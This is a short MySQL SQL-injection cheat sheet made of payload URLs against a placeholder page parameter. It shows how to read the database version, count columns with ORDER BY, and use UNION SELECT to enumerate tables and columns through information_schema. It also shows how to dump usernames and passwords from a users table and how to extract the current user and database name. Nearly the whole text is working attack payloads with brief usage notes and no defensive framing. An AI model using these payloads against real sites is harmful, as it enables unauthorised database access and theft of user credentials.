# For MYSQL DATABASE

## Extracting Database Version:
http://example.com/page.php?id=1' AND 1=CONCAT(0x3a, DATABASE(), 0x3a)--
http://example.com/page.php?id=1' AND 1=CONCAT(0x3a, @@version, 0x3a)--

## Union-Based SQL Injection (Extract Data):

#### Find the Number of Columns:
http://example.com/page.php?id=1 ORDER BY 1--
http://example.com/page.php?id=1 ORDER BY 2--
http://example.com/page.php?id=1 ORDER BY 3--

If the query returns an error like:

Unknown column '3' in 'order clause'
Then you know that the maximum number of columns is 2.

#### Extracting Data Using UNION:
Once you know the number of columns, you can union your query with the SELECT statement to retrieve data. For example:

http://example.com/page.php?id=1 UNION SELECT null, username, password FROM users--

Such as I have 5 columns so:
http://example.com/page.php?id=1 UNION SELECT NULL, username, password, NULL, NULL FROM users--

#### Retrieving Table Names:
Once you have access to the database, you can list the tables in the current database:

http://example.com/page.php?id=1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema=DATABASE()--


#### Retrieving Column Names:
To identify which columns to target, you can enumerate the column names for a specific table:

http://example.com/page.php?id=1 UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='users'--
This will return all column names in the user's table.

#### Dumping Data:
Now that you know the column names, you can dump the data. For example:

http://example.com/page.php?id=1 UNION SELECT null, username, password FROM users--
This will dump usernames and passwords from the user's table.


#### Additional Techniques
Extracting current user:

http://example.com/page.php?id=1' UNION SELECT null, user(), null--
This will give you the current MySQL user.

#### Extracting database name:

http://example.com/page.php?id=1' UNION SELECT null, database(), null--

